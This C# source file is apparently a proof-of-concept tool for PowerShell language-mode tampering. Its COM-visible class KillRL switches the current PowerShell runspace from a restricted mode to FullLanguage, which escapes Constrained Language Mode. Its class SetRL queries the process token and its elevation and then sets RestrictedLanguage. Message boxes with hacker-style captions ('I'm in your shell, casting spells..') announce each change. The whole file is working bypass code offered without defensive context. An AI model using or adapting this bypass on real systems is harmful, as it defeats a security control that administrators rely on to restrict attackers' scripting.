using System;
using System.Diagnostics;
using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace PLM
{
    [ComVisible(true)]
    public class SetRL
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public UInt32 LowPart;
            public Int32 HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LARGE_INTEGER
        {
            public UInt32 LowPart;
            public UInt32 HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_STATISTICS
        {
            public LUID TokenId;
            public LUID AuthenticationId;
            public LARGE_INTEGER ExpirationTime;
            public UInt32 TokenType;
            public UInt32 ImpersonationLevel;
            public UInt32 DynamicCharged;
            public UInt32 DynamicAvailable;
            public UInt32 GroupCount;
            public UInt32 PrivilegeCount;
            public LUID ModifiedId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_ELEVATION
        {
            public UInt32 TokenIsElevated;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_LAST_INTER_LOGON_INFO
        {
            public LARGE_INTEGER LastSuccessfulLogon;
            public LARGE_INTEGER LastFailedLogon;
            public UInt32 FailedAttemptCountSinceLastSuccessfulLogon;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_LOGON_SESSION_DATA
        {
            public UInt32 Size;
            public LUID LoginID;
            public UNICODE_STRING Username;
            public UNICODE_STRING LoginDomain;
            public UNICODE_STRING AuthenticationPackage;
            public UInt32 LogonType;
            public UInt32 Session;
            public IntPtr Sid;
            public LARGE_INTEGER LoginTime;
            public UNICODE_STRING LoginServer;
            public UNICODE_STRING DnsDomainName;
            public UNICODE_STRING Upn;
            public UInt32 UserFlags;
            public LSA_LAST_INTER_LOGON_INFO LastLogonInfo;
            public UNICODE_STRING LogonScript;
            public UNICODE_STRING ProfilePath;
            public UNICODE_STRING HomeDirectory;
            public UNICODE_STRING HomeDirectoryDrive;
            public LARGE_INTEGER LogoffTime;
            public LARGE_INTEGER KickOffTime;
            public LARGE_INTEGER PasswordLastSet;
            public LARGE_INTEGER PasswordCanChange;
            public LARGE_INTEGER PasswordMustChange;
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            UInt32 processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenThread(
            UInt32 dwDesiredAccess,
            bool bInheritHandle,
            UInt32 dwThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(
            IntPtr hObject);

        [DllImport("advapi32.dll")]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            int DesiredAccess,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll")]
        public static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            int DesiredAccess,
            bool OpenAsSelf,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll")]
        public static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            UInt32 TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            ref UInt32 ReturnLength);

        [DllImport("secur32.dll")]
        public static extern UInt32 LsaGetLogonSessionData(
            IntPtr LogonId,
            ref IntPtr ppLogonSessionData);

        [DllImport("advapi32.dll")]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            UInt32 dwDesiredAccess,
            IntPtr lpTokenAttributes,
            UInt32 ImpersonationLevel,
            UInt32 TokenType,
            ref IntPtr phNewToken);

        [DllImport("advapi32.dll")]
        public static extern bool ImpersonateLoggedOnUser(
            IntPtr hToken);

        [DllImport("advapi32.dll")]
        public static extern bool RevertToSelf();

        [DllImport("advapi32.dll")]
        public static extern bool LookupAccountSidW(
            IntPtr lpSystemName,
            IntPtr Sid,
            IntPtr lpName,
            ref UInt32 cchName,
            IntPtr ReferencedDomainName,
            ref UInt32 cchReferencedDomainName,
            ref UInt32 peUse);

        static private IntPtr GetPrimaryToken(int ProcID)
        {
            IntPtr hProcess = OpenProcess(0x400, true, ProcID);
            IntPtr hPrimaryToken = IntPtr.Zero;
            OpenProcessToken(hProcess, 0xf01ff, ref hPrimaryToken);
            CloseHandle(hProcess);
            return hPrimaryToken;
        }

        static private bool GetTokenElevation(IntPtr hToken)
        {
            int TokenElevationSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(TOKEN_ELEVATION));
            IntPtr pTokenElevation = System.Runtime.InteropServices.Marshal.AllocHGlobal(TokenElevationSize);
            UInt32 Length = 0;
            GetTokenInformation(hToken, 20, pTokenElevation, TokenElevationSize, ref Length);
            bool IsElevated = Convert.ToBoolean(System.Runtime.InteropServices.Marshal.ReadInt32(pTokenElevation));
            return IsElevated;
        }

        public SetRL()
        {
            try
            {
                // Get process information
                int ProcID = Process.GetCurrentProcess().Id;
                string ProcName = Process.GetProcessById(ProcID).ProcessName;
                IntPtr hToken = GetPrimaryToken(ProcID);
                bool Elevated = GetTokenElevation(hToken);

                // Prepare MsgBox params
                string MsgCaption = "[>] I'm in your shell, casting spells..";
                string ProcessDetails = string.Format("[?] PID: {0}, Proc: {1}, hToken: {2}, Elevated: {3}", ProcID, ProcName, hToken, Elevated);
                Enum LangMode = (PSLanguageMode)System.Management.Automation.Runspaces.Runspace.DefaultRunspace.SessionStateProxy.LanguageMode;
                Enum TargetLang = PSLanguageMode.RestrictedLanguage;
                string MsgResult = ProcessDetails + "\n\n+ Current PS Language -> " + LangMode.ToString() + "\n+ Changing to               -> " + TargetLang.ToString();
                MessageBox.Show(MsgResult, MsgCaption);

                // Set PowerShell LanguageMode
                System.Management.Automation.Runspaces.Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = (PSLanguageMode)TargetLang;
            }
            catch (Exception ex)
            {
                Trace.WriteLine(ex.ToString());
            }
        }
    }

    [ComVisible(true)]
    public class KillRL
    {
        public KillRL()
        {
            // Prepare MsgBox params
            string MsgCaption = "[>] I'm in your shell, casting spells..";
            string AlertMsg = "[?] Oh well ... yolo .. ¯\\_(ツ)_/¯ ..";
            Enum LangMode = (PSLanguageMode)System.Management.Automation.Runspaces.Runspace.DefaultRunspace.SessionStateProxy.LanguageMode;
            Enum TargetLang = PSLanguageMode.FullLanguage;
            string MsgResult = AlertMsg + "\n\n+ Current PS Language -> " + LangMode.ToString() + "\n+ Changing to               -> " + TargetLang.ToString();
            MessageBox.Show(MsgResult, MsgCaption);

            // Set PowerShell LanguageMode
            System.Management.Automation.Runspaces.Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = (PSLanguageMode)TargetLang;
        }
    }
}
